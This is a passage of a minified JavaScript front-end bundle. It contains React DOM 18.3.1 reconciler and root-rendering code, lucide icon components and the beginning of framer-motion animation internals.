e:for(;X!==null;){if(g=X,(g.flags&2048)!==0)switch(g.tag){case 0:case 11:case 15:es(9,g,g.return)}var D=g.sibling;if(D!==null){D.return=g.return,X=D;break e}X=g.return}}var R=t.current;for(X=R;X!==null;){b=X;var O=b.child;if((b.subtreeFlags&2064)!==0&&O!==null)O.return=b,X=O;else e:for(b=R;X!==null;){if(S=X,(S.flags&2048)!==0)try{switch(S.tag){case 0:case 11:case 15:Co(9,S)}}catch(re){Le(S,S.return,re)}if(S===b){X=null;break e}var $=S.sibling;if($!==null){$.return=S.return,X=$;break e}X=S.return}}if(we=h,En(),Jt&&typeof Jt.onPostCommitFiberRoot=="function")try{Jt.onPostCommitFiberRoot(Ls,t)}catch{}u=!0}return u}finally{Te=o,jt.transition=i}}return!1}function Zp(t,i,o){i=Gr(o,i),i=yp(t,i,1),t=_n(t,i,1),i=dt(),t!==null&&(Ei(t,1,i),yt(t,i))}function Le(t,i,o){if(t.tag===3)Zp(t,t,o);else for(;i!==null;){if(i.tag===3){Zp(i,t,o);break}else if(i.tag===1){var u=i.stateNode;if(typeof i.type.getDerivedStateFromError=="function"||typeof u.componentDidCatch=="function"&&(Rn===null||!Rn.has(u))){t=Gr(o,t),t=bp(i,t,1),i=_n(i,t,1),t=dt(),i!==null&&(Ei(i,1,t),yt(i,t));break}}i=i.return}}function Ow(t,i,o){var u=t.pingCache;u!==null&&u.delete(i),i=dt(),t.pingedLanes|=t.suspendedLanes&o,Ze===t&&(rt&o)===o&&(Ke===4||Ke===3&&(rt&130023424)===rt&&500>Ue()-dc?sr(t,0):uc|=o),yt(t,i)}function ef(t,i){i===0&&((t.mode&1)===0?i=1:(i=Us,Us<<=1,(Us&130023424)===0&&(Us=4194304)));var o=dt();t=ln(t,i),t!==null&&(Ei(t,i,o),yt(t,o))}function jw(t){var i=t.memoizedState,o=0;i!==null&&(o=i.retryLane),ef(t,o)}function Mw(t,i){var o=0;switch(t.tag){case 13:var u=t.stateNode,h=t.memoizedState;h!==null&&(o=h.retryLane);break;case 19:u=t.stateNode;break;default:throw Error(r(314))}u!==null&&u.delete(i),ef(t,o)}var tf;tf=function(t,i,o){if(t!==null)if(t.memoizedProps!==i.pendingProps||pt.current)gt=!0;else{if((t.lanes&o)===0&&(i.flags&128)===0)return gt=!1,xw(t,i,o);gt=(t.flags&131072)!==0}else gt=!1,je&&(i.flags&1048576)!==0&&jh(i,lo,i.index);switch(i.lanes=0,i.tag){case 2:var u=i.type;To(t,i),t=i.pendingProps;var h=Fr(i,st.current);Hr(i,o),h=Vl(null,i,u,t,h,o);var g=Wl();return i.flags|=1,typeof h=="object"&&h!==null&&typeof h.render=="function"&&h.$$typeof===void 0?(i.tag=1,i.memoizedState=null,i.updateQueue=null,ft(u)?(g=!0,so(i)):g=!1,i.memoizedState=h.state!==null&&h.state!==void 0?h.state:null,Ml(i),h.updater=xo,i.stateNode=h,h._reactInternals=i,Jl(i,u,t,o),i=Zl(null,i,u,!0,g,o)):(i.tag=0,je&&g&&Al(i),ut(null,i,h,o),i=i.child),i;case 16:u=i.elementType;e:{switch(To(t,i),t=i.pendingProps,h=u._init,u=h(u._payload),i.type=u,h=i.tag=Nw(u),t=zt(u,t),h){case 0:i=Xl(null,i,u,t,o);break e;case 1:i=Ep(null,i,u,t,o);break e;case 11:i=xp(null,i,u,t,o);break e;case 14:i=Sp(null,i,u,zt(u.type,t),o);break e}throw Error(r(306,u,""))}return i;case 0:return u=i.type,h=i.pendingProps,h=i.elementType===u?h:zt(u,h),Xl(t,i,u,h,o);case 1:return u=i.type,h=i.pendingProps,h=i.elementType===u?h:zt(u,h),Ep(t,i,u,h,o);case 3:e:{if(Pp(i),t===null)throw Error(r(387));u=i.pendingProps,g=i.memoizedState,h=g.element,Wh(t,i),go(i,u,null,o);var b=i.memoizedState;if(u=b.element,g.isDehydrated)if(g={element:u,isDehydrated:!1,cache:b.cache,pendingSuspenseBoundaries:b.pendingSuspenseBoundaries,transitions:b.transitions},i.updateQueue.baseState=g,i.memoizedState=g,i.flags&256){h=Gr(Error(r(423)),i),i=_p(t,i,u,o,h);break e}else if(u!==h){h=Gr(Error(r(424)),i),i=_p(t,i,u,o,h);break e}else for(Tt=Tn(i.stateNode.containerInfo.firstChild),St=i,je=!0,Ut=null,o=zh(i,null,u,o),i.child=o;o;)o.flags=o.flags&-3|4096,o=o.sibling;else{if(Vr(),u===h){i=un(t,i,o);break e}ut(t,i,u,o)}i=i.child}return i;case 5:return qh(i),t===null&&Pl(i),u=i.type,h=i.pendingProps,g=t!==null?t.memoizedProps:null,b=h.children,vl(u,h)?b=null:g!==null&&vl(u,g)&&(i.flags|=32),Cp(t,i),ut(t,i,b,o),i.child;case 6:return t===null&&Pl(i),null;case 13:return Ip(t,i,o);case 4:return Bl(i,i.stateNode.containerInfo),u=i.pendingProps,t===null?i.child=Wr(i,null,u,o):ut(t,i,u,o),i.child;case 11:return u=i.type,h=i.pendingProps,h=i.elementType===u?h:zt(u,h),xp(t,i,u,h,o);case 7:return ut(t,i,i.pendingProps,o),i.child;case 8:return ut(t,i,i.pendingProps.children,o),i.child;case 12:return ut(t,i,i.pendingProps.children,o),i.child;case 10:e:{if(u=i.type._context,h=i.pendingProps,g=i.memoizedProps,b=h.value,Pe(ho,u._currentValue),u._currentValue=b,g!==null)if(Ft(g.value,b)){if(g.children===h.children&&!pt.current){i=un(t,i,o);break e}}else for(g=i.child,g!==null&&(g.return=i);g!==null;){var S=g.dependencies;if(S!==null){b=g.child;for(var E=S.firstContext;E!==null;){if(E.context===u){if(g.tag===1){E=cn(-1,o&-o),E.tag=2;var j=g.updateQueue;if(j!==null){j=j.shared;var F=j.pending;F===null?E.next=E:(E.next=F.next,F.next=E),j.pending=E}}g.lanes|=o,E=g.alternate,E!==null&&(E.lanes|=o),Ol(g.return,o,i),S.lanes|=o;break}E=E.next}}else if(g.tag===10)b=g.type===i.type?null:g.child;else if(g.tag===18){if(b=g.return,b===null)throw Error(r(341));b.lanes|=o,S=b.alternate,S!==null&&(S.lanes|=o),Ol(b,o,i),b=g.sibling}else b=g.child;if(b!==null)b.return=g;else for(b=g;b!==null;){if(b===i){b=null;break}if(g=b.sibling,g!==null){g.return=b.return,b=g;break}b=b.return}g=b}ut(t,i,h.children,o),i=i.child}return i;case 9:return h=i.type,u=i.pendingProps.children,Hr(i,o),h=Dt(h),u=u(h),i.flags|=1,ut(t,i,u,o),i.child;case 14:return u=i.type,h=zt(u,i.pendingProps),h=zt(u.type,h),Sp(t,i,u,h,o);case 15:return Tp(t,i,i.type,i.pendingProps,o);case 17:return u=i.type,h=i.pendingProps,h=i.elementType===u?h:zt(u,h),To(t,i),i.tag=1,ft(u)?(t=!0,so(i)):t=!1,Hr(i,o),gp(i,u,h),Jl(i,u,h,o),Zl(null,i,u,!0,t,o);case 19:return Dp(t,i,o);case 22:return Ap(t,i,o)}throw Error(r(156,i.tag))};function nf(t,i){return Md(t,i)}function Bw(t,i,o,u){this.tag=t,this.key=o,this.sibling=this.child=this.return=this.stateNode=this.type=this.elementType=null,this.index=0,this.ref=null,this.pendingProps=i,this.dependencies=this.memoizedState=this.updateQueue=this.memoizedProps=null,this.mode=u,this.subtreeFlags=this.flags=0,this.deletions=null,this.childLanes=this.lanes=0,this.alternate=null}function Mt(t,i,o,u){return new Bw(t,i,o,u)}function vc(t){return t=t.prototype,!(!t||!t.isReactComponent)}function Nw(t){if(typeof t=="function")return vc(t)?1:0;if(t!=null){if(t=t.$$typeof,t===q)return 11;if(t===fe)return 14}return 2}function Mn(t,i){var o=t.alternate;return o===null?(o=Mt(t.tag,i,t.key,t.mode),o.elementType=t.elementType,o.type=t.type,o.stateNode=t.stateNode,o.alternate=t,t.alternate=o):(o.pendingProps=i,o.type=t.type,o.flags=0,o.subtreeFlags=0,o.deletions=null),o.flags=t.flags&14680064,o.childLanes=t.childLanes,o.lanes=t.lanes,o.child=t.child,o.memoizedProps=t.memoizedProps,o.memoizedState=t.memoizedState,o.updateQueue=t.updateQueue,i=t.dependencies,o.dependencies=i===null?null:{lanes:i.lanes,firstContext:i.firstContext},o.sibling=t.sibling,o.index=t.index,o.ref=t.ref,o}function Mo(t,i,o,u,h,g){var b=2;if(u=t,typeof t=="function")vc(t)&&(b=1);else if(typeof t=="string")b=5;else e:switch(t){case W:return ar(o.children,h,g,i);case G:b=8,h|=8;break;case ee:return t=Mt(12,o,i,h|2),t.elementType=ee,t.lanes=g,t;case le:return t=Mt(13,o,i,h),t.elementType=le,t.lanes=g,t;case K:return t=Mt(19,o,i,h),t.elementType=K,t.lanes=g,t;case pe:return Bo(o,h,g,i);default:if(typeof t=="object"&&t!==null)switch(t.$$typeof){case ye:b=10;break e;case Ae:b=9;break e;case q:b=11;break e;case fe:b=14;break e;case ae:b=16,u=null;break e}throw Error(r(130,t==null?t:typeof t,""))}return i=Mt(b,o,i,h),i.elementType=t,i.type=u,i.lanes=g,i}function ar(t,i,o,u){return t=Mt(7,t,u,i),t.lanes=o,t}function Bo(t,i,o,u){return t=Mt(22,t,u,i),t.elementType=pe,t.lanes=o,t.stateNode={isHidden:!1},t}function wc(t,i,o){return t=Mt(6,t,null,i),t.lanes=o,t}function kc(t,i,o){return i=Mt(4,t.children!==null?t.children:[],t.key,i),i.lanes=o,i.stateNode={containerInfo:t.containerInfo,pendingChildren:null,implementation:t.implementation},i}function Lw(t,i,o,u,h){this.tag=i,this.containerInfo=t,this.finishedWork=this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.pendingContext=this.context=null,this.callbackPriority=0,this.eventTimes=Ka(0),this.expirationTimes=Ka(-1),this.entangledLanes=this.finishedLanes=this.mutableReadLanes=this.expiredLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=Ka(0),this.identifierPrefix=u,this.onRecoverableError=h,this.mutableSourceEagerHydrationData=null}function xc(t,i,o,u,h,g,b,S,E){return t=new Lw(t,i,o,S,E),i===1?(i=1,g===!0&&(i|=8)):i=0,g=Mt(3,null,null,i),t.current=g,g.stateNode=t,g.memoizedState={element:u,isDehydrated:o,cache:null,transitions:null,pendingSuspenseBoundaries:null},Ml(g),t}function Fw(t,i,o){var u=3<arguments.length&&arguments[3]!==void 0?arguments[3]:null;return{$$typeof:U,key:u==null?null:""+u,children:t,containerInfo:i,implementation:o}}function rf(t){if(!t)return Cn;t=t._reactInternals;e:{if(Jn(t)!==t||t.tag!==1)throw Error(r(170));var i=t;do{switch(i.tag){case 3:i=i.stateNode.context;break e;case 1:if(ft(i.type)){i=i.stateNode.__reactInternalMemoizedMergedChildContext;break e}}i=i.return}while(i!==null);throw Error(r(171))}if(t.tag===1){var o=t.type;if(ft(o))return Rh(t,o,i)}return i}function sf(t,i,o,u,h,g,b,S,E){return t=xc(o,u,!0,t,h,g,b,S,E),t.context=rf(null),o=t.current,u=dt(),h=On(o),g=cn(u,h),g.callback=i??null,_n(o,g,h),t.current.lanes=h,Ei(t,h,u),yt(t,u),t}function No(t,i,o,u){var h=i.current,g=dt(),b=On(h);return o=rf(o),i.context===null?i.context=o:i.pendingContext=o,i=cn(g,b),i.payload={element:t},u=u===void 0?null:u,u!==null&&(i.callback=u),t=_n(h,i,b),t!==null&&($t(t,h,b,g),fo(t,h,b)),b}function Lo(t){if(t=t.current,!t.child)return null;switch(t.child.tag){case 5:return t.child.stateNode;default:return t.child.stateNode}}function of(t,i){if(t=t.memoizedState,t!==null&&t.dehydrated!==null){var o=t.retryLane;t.retryLane=o!==0&&o<i?o:i}}function Sc(t,i){of(t,i),(t=t.alternate)&&of(t,i)}function Uw(){return null}var af=typeof reportError=="function"?reportError:function(t){console.error(t)};function Tc(t){this._internalRoot=t}Fo.prototype.render=Tc.prototype.render=function(t){var i=this._internalRoot;if(i===null)throw Error(r(409));No(t,i,null,null)},Fo.prototype.unmount=Tc.prototype.unmount=function(){var t=this._internalRoot;if(t!==null){this._internalRoot=null;var i=t.containerInfo;ir(function(){No(null,t,null,null)}),i[rn]=null}};function Fo(t){this._internalRoot=t}Fo.prototype.unstable_scheduleHydration=function(t){if(t){var i=Wd();t={blockedOn:null,target:t,priority:i};for(var o=0;o<kn.length&&i!==0&&i<kn[o].priority;o++);kn.splice(o,0,t),o===0&&qd(t)}};function Ac(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11)}function Uo(t){return!(!t||t.nodeType!==1&&t.nodeType!==9&&t.nodeType!==11&&(t.nodeType!==8||t.nodeValue!==" react-mount-point-unstable "))}function lf(){}function zw(t,i,o,u,h){if(h){if(typeof u=="function"){var g=u;u=function(){var j=Lo(b);g.call(j)}}var b=sf(i,u,t,0,null,!1,!1,"",lf);return t._reactRootContainer=b,t[rn]=b.current,zi(t.nodeType===8?t.parentNode:t),ir(),b}for(;h=t.lastChild;)t.removeChild(h);if(typeof u=="function"){var S=u;u=function(){var j=Lo(E);S.call(j)}}var E=xc(t,0,!1,null,null,!1,!1,"",lf);return t._reactRootContainer=E,t[rn]=E.current,zi(t.nodeType===8?t.parentNode:t),ir(function(){No(i,E,o,u)}),E}function zo(t,i,o,u,h){var g=o._reactRootContainer;if(g){var b=g;if(typeof h=="function"){var S=h;h=function(){var E=Lo(b);S.call(E)}}No(i,b,t,h)}else b=zw(o,i,t,h,u);return Lo(b)}zd=function(t){switch(t.tag){case 3:var i=t.stateNode;if(i.current.memoizedState.isDehydrated){var o=Ci(i.pendingLanes);o!==0&&(Ja(i,o|1),yt(i,Ue()),(we&6)===0&&(Qr=Ue()+500,En()))}break;case 13:ir(function(){var u=ln(t,1);if(u!==null){var h=dt();$t(u,t,1,h)}}),Sc(t,1)}},Qa=function(t){if(t.tag===13){var i=ln(t,134217728);if(i!==null){var o=dt();$t(i,t,134217728,o)}Sc(t,134217728)}},Vd=function(t){if(t.tag===13){var i=On(t),o=ln(t,i);if(o!==null){var u=dt();$t(o,t,i,u)}Sc(t,i)}},Wd=function(){return Te},$d=function(t,i){var o=Te;try{return Te=t,i()}finally{Te=o}},Va=function(t,i,o){switch(i){case"input":if(ja(t,o),i=o.name,o.type==="radio"&&i!=null){for(o=t;o.parentNode;)o=o.parentNode;for(o=o.querySelectorAll("input[name="+JSON.stringify(""+i)+'][type="radio"]'),i=0;i<o.length;i++){var u=o[i];if(u!==t&&u.form===t.form){var h=ro(u);if(!h)throw Error(r(90));Da(u),ja(u,h)}}}break;case"textarea":vd(t,o);break;case"select":i=o.value,i!=null&&Er(t,!!o.multiple,i,!1)}},Pd=mc,_d=ir;var Vw={usingClientEntryPoint:!1,Events:[$i,Nr,ro,Cd,Ed,mc]},is={findFiberByHostInstance:Qn,bundleType:0,version:"18.3.1",rendererPackageName:"react-dom"},Ww={bundleType:is.bundleType,version:is.version,rendererPackageName:is.rendererPackageName,rendererConfig:is.rendererConfig,overrideHookState:null,overrideHookStateDeletePath:null,overrideHookStateRenamePath:null,overrideProps:null,overridePropsDeletePath:null,overridePropsRenamePath:null,setErrorHandler:null,setSuspenseHandler:null,scheduleUpdate:null,currentDispatcherRef:M.ReactCurrentDispatcher,findHostInstanceByFiber:function(t){return t=Od(t),t===null?null:t.stateNode},findFiberByHostInstance:is.findFiberByHostInstance||Uw,findHostInstancesForRefresh:null,scheduleRefresh:null,scheduleRoot:null,setRefreshHandler:null,getCurrentFiber:null,reconcilerVersion:"18.3.1-next-f1338f8080-20240426"};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<"u"){var Vo=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Vo.isDisabled&&Vo.supportsFiber)try{Ls=Vo.inject(Ww),Jt=Vo}catch{}}return bt.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED=Vw,bt.createPortal=function(t,i){var o=2<arguments.length&&arguments[2]!==void 0?arguments[2]:null;if(!Ac(i))throw Error(r(200));return Fw(t,i,null,o)},bt.createRoot=function(t,i){if(!Ac(t))throw Error(r(299));var o=!1,u="",h=af;return i!=null&&(i.unstable_strictMode===!0&&(o=!0),i.identifierPrefix!==void 0&&(u=i.identifierPrefix),i.onRecoverableError!==void 0&&(h=i.onRecoverableError)),i=xc(t,1,!1,null,null,o,!1,u,h),t[rn]=i.current,zi(t.nodeType===8?t.parentNode:t),new Tc(i)},bt.findDOMNode=function(t){if(t==null)return null;if(t.nodeType===1)return t;var i=t._reactInternals;if(i===void 0)throw typeof t.render=="function"?Error(r(188)):(t=Object.keys(t).join(","),Error(r(268,t)));return t=Od(i),t=t===null?null:t.stateNode,t},bt.flushSync=function(t){return ir(t)},bt.hydrate=function(t,i,o){if(!Uo(i))throw Error(r(200));return zo(null,t,i,!0,o)},bt.hydrateRoot=function(t,i,o){if(!Ac(t))throw Error(r(405));var u=o!=null&&o.hydratedSources||null,h=!1,g="",b=af;if(o!=null&&(o.unstable_strictMode===!0&&(h=!0),o.identifierPrefix!==void 0&&(g=o.identifierPrefix),o.onRecoverableError!==void 0&&(b=o.onRecoverableError)),i=sf(i,null,t,1,o??null,h,!1,g,b),t[rn]=i.current,zi(t),u)for(t=0;t<u.length;t++)o=u[t],h=o._getVersion,h=h(o._source),i.mutableSourceEagerHydrationData==null?i.mutableSourceEagerHydrationData=[o,h]:i.mutableSourceEagerHydrationData.push(o,h);return new Fo(i)},bt.render=function(t,i,o){if(!Uo(i))throw Error(r(200));return zo(null,t,i,!1,o)},bt.unmountComponentAtNode=function(t){if(!Uo(t))throw Error(r(40));return t._reactRootContainer?(ir(function(){zo(null,null,t,!1,function(){t._reactRootContainer=null,t[rn]=null})}),!0):!1},bt.unstable_batchedUpdates=mc,bt.unstable_renderSubtreeIntoContainer=function(t,i,o,u){if(!Uo(o))throw Error(r(200));if(t==null||t._reactInternals===void 0)throw Error(r(38));return zo(t,i,o,!1,u)},bt.version="18.3.1-next-f1338f8080-20240426",bt}var mf;function im(){if(mf)return Pc.exports;mf=1;function n(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>"u"||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!="function"))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(n)}catch(e){console.error(e)}}return n(),Pc.exports=Zw(),Pc.exports}var yf;function e0(){if(yf)return Wo;yf=1;var n=im();return Wo.createRoot=n.createRoot,Wo.hydrateRoot=n.hydrateRoot,Wo}var t0=e0();const n0=wa(t0);var r0={xmlns:"http://www.w3.org/2000/svg",width:24,height:24,viewBox:"0 0 24 24",fill:"none",stroke:"currentColor",strokeWidth:2,strokeLinecap:"round",strokeLinejoin:"round"};const i0=n=>n.replace(/([a-z0-9])([A-Z])/g,"$1-$2").toLowerCase(),Fe=(n,e)=>{const r=C.forwardRef(({color:s="currentColor",size:a=24,strokeWidth:l=2,absoluteStrokeWidth:c,children:d,...p},f)=>C.createElement("svg",{ref:f,...r0,width:a,height:a,stroke:s,strokeWidth:c?Number(l)*24/Number(a):l,className:`lucide lucide-${i0(n)}`,...p},[...e.map(([m,y])=>C.createElement(m,y)),...(Array.isArray(d)?d:[d])||[]]));return r.displayName=`${n}`,r},s0=Fe("AlertTriangle",[["path",{d:"m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z",key:"c3ski4"}],["path",{d:"M12 9v4",key:"juzpu7"}],["path",{d:"M12 17h.01",key:"p32p05"}]]),sm=Fe("Archive",[["rect",{width:"20",height:"5",x:"2",y:"3",rx:"1",key:"1wp1u1"}],["path",{d:"M4 8v11a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8",key:"1s80jp"}],["path",{d:"M10 12h4",key:"a56b0p"}]]),o0=Fe("ArrowLeft",[["path",{d:"m12 19-7-7 7-7",key:"1l729n"}],["path",{d:"M19 12H5",key:"x3x0zl"}]]),om=Fe("ArrowRight",[["path",{d:"M5 12h14",key:"1ays0h"}],["path",{d:"m12 5 7 7-7 7",key:"xquz4c"}]]),am=Fe("CalendarDays",[["rect",{width:"18",height:"18",x:"3",y:"4",rx:"2",ry:"2",key:"eu3xkr"}],["line",{x1:"16",x2:"16",y1:"2",y2:"6",key:"m3sa8f"}],["line",{x1:"8",x2:"8",y1:"2",y2:"6",key:"18kwsl"}],["line",{x1:"3",x2:"21",y1:"10",y2:"10",key:"xt86sb"}],["path",{d:"M8 14h.01",key:"6423bh"}],["path",{d:"M12 14h.01",key:"1etili"}],["path",{d:"M16 14h.01",key:"1gbofw"}],["path",{d:"M8 18h.01",key:"lrp35t"}],["path",{d:"M12 18h.01",key:"mhygvu"}],["path",{d:"M16 18h.01",key:"kzsmim"}]]),a0=Fe("ChevronLeft",[["path",{d:"m15 18-6-6 6-6",key:"1wnfg3"}]]),l0=Fe("ChevronRight",[["path",{d:"m9 18 6-6-6-6",key:"mthhwq"}]]),c0=Fe("Eye",[["path",{d:"M2 12s3-7 10-7 10 7 10 7-3 7-10 7-10-7-10-7Z",key:"rwhkz3"}],["circle",{cx:"12",cy:"12",r:"3",key:"1v7zrd"}]]),u0=Fe("Github",[["path",{d:"M15 22v-4a4.8 4.8 0 0 0-1-3.5c3 0 6-2 6-5.5.08-1.25-.27-2.48-1-3.5.28-1.15.28-2.35 0-3.5 0 0-1 0-3 1.5-2.64-.5-5.36-.5-8 0C6 2 5 2 5 2c-.3 1.15-.3 2.35 0 3.5A5.403 5.403 0 0 0 4 9c0 3.5 3 5.5 6 5.5-.39.49-.68 1.05-.85 1.65-.17.6-.22 1.23-.15 1.85v4",key:"tonef"}],["path",{d:"M9 18c-4.51 2-5-2-7-2",key:"9comsn"}]]),d0=Fe("Heart",[["path",{d:"M19 14c1.49-1.46 3-3.21 3-5.5A5.5 5.5 0 0 0 16.5 3c-1.76 0-3 .5-4.5 2-1.5-1.5-2.74-2-4.5-2A5.5 5.5 0 0 0 2 8.5c0 2.3 1.5 4.05 3 5.5l7 7Z",key:"c3ymky"}]]),h0=Fe("Home",[["path",{d:"m3 9 9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z",key:"y5dka4"}],["polyline",{points:"9 22 9 12 15 12 15 22",key:"e2us08"}]]),p0=Fe("Linkedin",[["path",{d:"M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z",key:"c2jq9f"}],["rect",{width:"4",height:"12",x:"2",y:"9",key:"mk3on5"}],["circle",{cx:"4",cy:"4",r:"2",key:"bt5ra8"}]]),f0=Fe("MessageSquare",[["path",{d:"M21 15a2 2 0 0 1-2 2H7l-4 4V5a2 2 0 0 1 2-2h14a2 2 0 0 1 2 2z",key:"1lielz"}]]),g0=Fe("Rss",[["path",{d:"M4 11a9 9 0 0 1 9 9",key:"pv89mb"}],["path",{d:"M4 4a16 16 0 0 1 16 16",key:"k0647b"}],["circle",{cx:"5",cy:"19",r:"1",key:"bfqh0e"}]]),lm=Fe("Search",[["circle",{cx:"11",cy:"11",r:"8",key:"4ej97u"}],["path",{d:"m21 21-4.3-4.3",key:"1qie3q"}]]),m0=Fe("Send",[["path",{d:"m22 2-7 20-4-9-9-4Z",key:"1q3vgg"}],["path",{d:"M22 2 11 13",key:"nzbqef"}]]),y0=Fe("Tag",[["path",{d:"M12 2H2v10l9.29 9.29c.94.94 2.48.94 3.42 0l6.58-6.58c.94-.94.94-2.48 0-3.42L12 2Z",key:"14b2ls"}],["path",{d:"M7 7h.01",key:"7u93v4"}]]),b0=Fe("Trash2",[["path",{d:"M3 6h18",key:"d0wm0j"}],["path",{d:"M19 6v14c0 1-1 2-2 2H7c-1 0-2-1-2-2V6",key:"4alrt4"}],["path",{d:"M8 6V4c0-1 1-2 2-2h4c1 0 2 1 2 2v2",key:"v07s0e"}],["line",{x1:"10",x2:"10",y1:"11",y2:"17",key:"1uufr5"}],["line",{x1:"14",x2:"14",y1:"11",y2:"17",key:"xtxkd"}]]),v0=Fe("Twitter",[["path",{d:"M22 4s-.7 2.1-2 3.4c1.6 10-9.4 17.3-18 11.6 2.2.1 4.4-.6 6-2C3 15.5.5 9.6 3 5c2.2 2.6 5.6 4.1 9 4-.9-4.2 4-6.6 7-3.8 1.1 0 3-1.2 3-1.2z",key:"pff0z6"}]]),cm=Fe("UserCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["circle",{cx:"12",cy:"10",r:"3",key:"ilqhr7"}],["path",{d:"M7 20.662V19a2 2 0 0 1 2-2h6a2 2 0 0 1 2 2v1.662",key:"154egf"}]]),sa=Fe("XCircle",[["circle",{cx:"12",cy:"12",r:"10",key:"1mglay"}],["path",{d:"m15 9-6 6",key:"1uzhvr"}],["path",{d:"m9 9 6 6",key:"z0biqf"}]]),w0=Fe("X",[["path",{d:"M18 6 6 18",key:"1bl5f8"}],["path",{d:"m6 6 12 12",key:"d8bk6v"}]]),um=C.createContext({transformPagePoint:n=>n,isStatic:!1,reducedMotion:"never"}),ka=C.createContext({}),xa=C.createContext(null),Sa=typeof document<"u",ju=Sa?C.useLayoutEffect:C.useEffect,dm=C.createContext({strict:!1}),Mu=n=>n.replace(/([a-z])([A-Z])/g,"$1-$2").toLowerCase(),k0="framerAppearId",hm="data-"+Mu(k0);function x0(n,e,r,s){const{visualElement:a}=C.useContext(ka),l=C.useContext(dm),c=C.useContext(xa),d=C.useContext(um).reducedMotion,p=C.useRef();s=s||l.renderer,!p.current&&s&&(p.current=s(n,{visualState:e,parent:a,props:r,presenceContext:c,blockInitialAnimation:c?c.initial===!1:!1,reducedMotionConfig:d}));const f=p.current;C.useInsertionEffect(()=>{f&&f.update(r,c)});const m=C.useRef(!!(r[hm]&&!window.HandoffComplete));return ju(()=>{f&&(f.render(),m.current&&f.animationState&&f.animationState.animateChanges())}),C.useEffect(()=>{f&&(f.updateFeatures(),!m.current&&f.animationState&&f.animationState.animateChanges(),m.current&&(m.current=!1,window.HandoffComplete=!0))}),f}function di(n){return n&&typeof n=="object"&&Object.prototype.hasOwnProperty.call(n,"current")}function S0(n,e,r){return C.useCallback(s=>{s&&n.mount&&n.mount(s),e&&(s?e.mount(s):e.unmount()),r&&(typeof r=="function"?r(s):di(r)&&(r.current=s))},[e])}function ws(n){return typeof n=="string"||Array.isArray(n)}function Ta(n){return n!==null&&typeof n=="object"&&typeof n.start=="function"}const Bu=["animate","whileInView","whileFocus","whileHover","whileTap","whileDrag","exit"],Nu=["initial",...Bu];function Aa(n){return Ta(n.animate)||Nu.some(e=>ws(n[e]))}function pm(n){return!!(Aa(n)||n.variants)}function T0(n,e){if(Aa(n)){const{initial:r,animate:s}=n;return{initial:r===!1||ws(r)?r:void 0,animate:ws(s)?s:void 0}}return n.inherit!==!1?e:{}}function A0(n){const{initial:e,animate:r}=T0(n,C.useContext(ka));return C.useMemo(()=>({initial:e,animate:r}),[bf(e),bf(r)])}function bf(n){return Array.isArray(n)?n.join(" "):n}const vf={animation:["animate","variants","whileHover","whileTap","exit","whileInView","whileFocus","whileDrag"],exit:["exit"],drag:["drag","dragControls"],focus:["whileFocus"],hover:["whileHover","onHoverStart","onHoverEnd"],tap:["whileTap","onTap","onTapStart","onTapCancel"],pan:["onPan","onPanStart","onPanSessionStart","onPanEnd"],inView:["whileInView","onViewportEnter","onViewportLeave"],layout:["layout","layoutId"]},ks={};for(const n in vf)ks[n]={isEnabled:e=>vf[n].some(r=>!!e[r])};function C0(n){for(const e in n)ks[e]={...ks[e],...n[e]}}const Lu=C.createContext({}),fm=C.createContext({}),E0=Symbol.for("motionComponentSymbol");function P0({preloadedFeatures:n,createVisualElement:e,useRender:r,useVisualState:s,Component:a}){n&&C0(n);function l(d,p){let f;const m={...C.useContext(um),...d,layoutId:_0(d)},{isStatic:y}=m,v=A0(d),w=s(d,y);if(!y&&Sa){v.visualElement=x0(a,w,m,e);const A=C.useContext(fm),k=C.useContext(dm).strict;v.visualElement&&(f=v.visualElement.loadFeatures(m,k,n,A))}return C.createElement(ka.Provider,{value:v},f&&v.visualElement?C.createElement(f,{visualElement:v.visualElement,...m}):null,r(a,d,S0(w,v.visualElement,p),w,y,v.visualElement))}const c=C.forwardRef(l);return c[E0]=a,c}function _0({layoutId:n}){const e=C.useContext(Lu).id;return e&&n!==void 0?e+"-"+n:n}function I0(n){function e(s,a={}){return P0(n(s,a))}if(typeof Proxy>"u")return e;const r=new Map;return new Proxy(e,{get:(s,a)=>(r.has(a)||r.set(a,e(a)),r.get(a))})}const R0=["animate","circle","defs","desc","ellipse","g","image","line","filter","marker","mask","metadata","path","pattern","polygon","polyline","rect","stop","switch","symbol","svg","text","tspan","use","view"];function Fu(n){return typeof n!="string"||n.includes("-")?!1:!!(R0.indexOf(n)>-1||/[A-Z]/.test(n))}const oa={};function D0(n){Object.assign(oa,n)}const Cs=["transformPerspective","x","y","z","translateX","translateY","translateZ","scale","scaleX","scaleY","rotate","rotateX","rotateY","rotateZ","skew","skewX","skewY"],Sr=new Set(Cs);function gm(n,{layout:e,layoutId:r}){return Sr.has(n)||n.startsWith("origin")||(e||r!==void 0)&&(!!oa[n]||n==="opacity")}const wt=n=>!!(n&&n.getVelocity),O0={x:"translateX",y:"translateY",z:"translateZ",transformPerspective:"perspective"},j0=Cs.length;function M0(n,{enableHardwareAcceleration:e=!0,allowTransformNone:r=!0},s,a){let l="";for(let c=0;c<j0;c++){const d=Cs[c];if(n[d]!==void 0){const p=O0[d]||d;l+=`${p}(${n[d]}) `}}return e&&!n.z&&(l+="translateZ(0)"),l=l.trim(),a?l=a(n,s?"":l):r&&s&&(l="none"),l}const mm=n=>e=>typeof 